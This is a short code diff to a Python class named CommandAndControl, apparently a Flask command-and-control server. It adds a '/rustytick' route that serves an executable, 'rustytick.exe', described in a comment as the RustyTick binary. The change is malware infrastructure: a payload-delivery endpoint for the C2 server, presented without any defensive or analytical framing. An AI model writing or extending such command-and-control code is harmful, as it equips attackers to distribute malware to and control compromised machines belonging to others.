@@ -65,6 +65,10 @@ class CommandAndControl:
             while not self.response_queue.empty():
                 responses.append(self.response_queue.get())
             return jsonify({"responses": responses})
+        
+        @self.app.route("/rustytick", methods=["GET"])
+        def rustytick():
+            return send_file("rustytick.exe")  # Replace with actual path to RustyTick binary
 
     def run(self):
         self.app.run(host=self.SERVER_IP, port=self.SERVER_PORT)
